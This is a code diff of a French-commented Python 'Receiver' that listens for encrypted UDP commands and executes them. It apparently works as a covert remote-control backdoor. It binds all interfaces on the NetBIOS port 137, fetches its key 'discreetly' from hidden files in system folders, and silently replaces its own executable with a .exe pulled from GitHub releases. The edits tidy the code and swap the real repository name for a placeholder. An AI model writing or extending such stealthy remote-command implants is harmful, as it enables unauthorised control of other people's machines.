@@ -4,6 +4,7 @@ import sys
 import os
 import hashlib
 import time
+import base64
 import requests
 import tempfile
 import shutil
@@ -12,15 +13,16 @@ from cryptography.fernet import Fernet
 HOST = "0.0.0.0"
 PORT = 137  # Port NetBIOS
 VERSION = "1.0.0"
-GITHUB_REPO = "YelloWorld5847/socket_com"
+GITHUB_REPO = "votre_username/votre_repo"  # À MODIFIER
 MAX_TIME_DIFF = 30  # Accepte les messages de max 30 secondes
 
 
 def get_secret_key():
-    # cherche dans plusieurs emplacements possibles
+    """Récupère la clé depuis la variable d'environnement de manière discrète"""
+    # Cherche dans plusieurs emplacements possibles
     key = os.environ.get('REMOTE_KEY') or os.environ.get('RK') or os.environ.get('SYSTEM_REMOTE')
     if not key:
-        # tente de lire depuis un fichier caché (optionnel)
+        # Tente de lire depuis un fichier caché (optionnel)
         config_paths = [
             os.path.join(os.path.expanduser('~'), '.remote_config'),
             'C:\\Windows\\System32\\config\\remote.key' if sys.platform.startswith('win') else '/etc/.remote_key'
@@ -40,15 +42,16 @@ def get_secret_key():
         sys.exit(1)
 
     key_hash = hashlib.sha256(key.encode()).digest()
-    return Fernet(hashlib.urlsafe_b64encode(key_hash))
+    return Fernet(base64.urlsafe_b64encode(key_hash))
 
 
 def decrypt_message(cipher, encrypted_data):
+    """Déchiffre et valide le message"""
     try:
         decrypted = cipher.decrypt(encrypted_data).decode()
         timestamp, command = decrypted.split('|', 1)
 
-        # vérifier que le message n'est pas trop vieux (protection contre replay attacks)
+        # Vérifier que le message n'est pas trop vieux (protection contre replay attacks)
         msg_time = int(timestamp)
         current_time = int(time.time())
         if abs(current_time - msg_time) > MAX_TIME_DIFF:
@@ -60,7 +63,7 @@ def decrypt_message(cipher, encrypted_data):
 
 
 def check_for_updates():
-    """vérifie si une nouvelle version est disponible sur GitHub"""
+    """Vérifie si une nouvelle version est disponible sur GitHub"""
     try:
         url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
         response = requests.get(url, timeout=5)
@@ -78,8 +81,9 @@ def check_for_updates():
 
 
 def download_and_update(release_info):
+    """Télécharge et installe la nouvelle version"""
     try:
-        # cherche le fichier .exe dans les assets
+        # Cherche le fichier .exe dans les assets
         exe_asset = None
         for asset in release_info['assets']:
             if asset['name'].endswith('.exe'):
@@ -93,21 +97,21 @@ def download_and_update(release_info):
         print(f"⬇ Téléchargement de {exe_asset['name']}...")
         response = requests.get(exe_asset['browser_download_url'], stream=True)
 
-        # télécharge dans un fichier temporaire
+        # Télécharge dans un fichier temporaire
         with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as tmp_file:
             for chunk in response.iter_content(chunk_size=8192):
                 tmp_file.write(chunk)
             tmp_path = tmp_file.name
 
-        # remplace l'ancien fichier
+        # Remplace l'ancien fichier
         current_exe = sys.executable if getattr(sys, 'frozen', False) else __file__
         backup_path = current_exe + '.backup'
 
-        # sauvegarde l'ancien
+        # Sauvegarde l'ancien
         if os.path.exists(current_exe):
             shutil.copy2(current_exe, backup_path)
 
-        # installe le nouveau
+        # Installe le nouveau
         shutil.move(tmp_path, current_exe)
         print("✓ Mise à jour installée avec succès!")
         print("⚠ Redémarrez le programme pour utiliser la nouvelle version")
@@ -118,6 +122,7 @@ def download_and_update(release_info):
 
 
 def execute_command(data):
+    """Exécute la commande reçue"""
     print(f"📥 Commande: {data}")
 
     if data == "PING":
@@ -147,10 +152,10 @@ def server_loop():
 
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
         s.bind((HOST, PORT))
-        print(f"Receiver v{VERSION} démarré sur port {PORT}")
-        print("En attente de commandes sécurisées...")
+        print(f"🔐 Receiver v{VERSION} démarré sur port {PORT}")
+        print("⏳ En attente de commandes sécurisées...")
 
-        # vérifier les mises à jour au démarrage
+        # Vérifier les mises à jour au démarrage
         release = check_for_updates()
         if release:
             print(f"💡 Pour mettre à jour, envoyez la commande UPDATE")
